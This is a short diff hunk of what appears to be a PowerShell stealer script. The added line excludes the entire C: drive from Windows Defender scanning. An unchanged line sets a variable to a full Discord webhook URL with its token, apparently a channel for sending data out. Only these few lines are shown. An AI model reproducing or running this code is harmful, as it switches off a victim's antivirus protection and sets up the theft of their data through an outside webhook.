@@ -1,4 +1,4 @@
-
+Add-MpPreference -ExclusionPath “C:”
 
 $dc = "https://discord.com/api/webhooks/1201175701563383979/fmbj3ItMmfq79ds-7vVtgDD28nUqY3RfpN72t6LZsJs9dXG3nHeRlgk_Eyzq_5UMK8v9"
 
